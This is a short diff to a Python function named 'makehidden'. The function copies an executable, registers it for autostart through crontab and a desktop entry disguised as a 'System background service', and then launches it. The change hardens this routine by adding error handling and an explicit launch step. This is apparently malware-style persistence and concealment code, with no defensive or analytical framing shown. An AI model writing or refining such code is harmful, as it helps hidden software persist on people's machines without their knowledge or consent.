@@ -104,8 +104,17 @@ Comment=System background service
                         ["crontab", "-"], input=new_cron.encode(), check=True
                     )
 
-        except:
-            pass
+        except (subprocess.CalledProcessError, OSError, PermissionError) as e:
+            print(f"Error setting up autostart: {e}")
+            # Continue even if autostart fails - we can try again later
+
+        # Launch the copied executable
+        try:
+            subprocess.Popen(target_file_path, shell=False)
+            return True
+        except (OSError, subprocess.SubprocessError) as e:
+            print(f"Error launching executable: {e}")
+            return False
 
     except Exception as e:
         print(f"Unexpected error in makehidden: {e}")
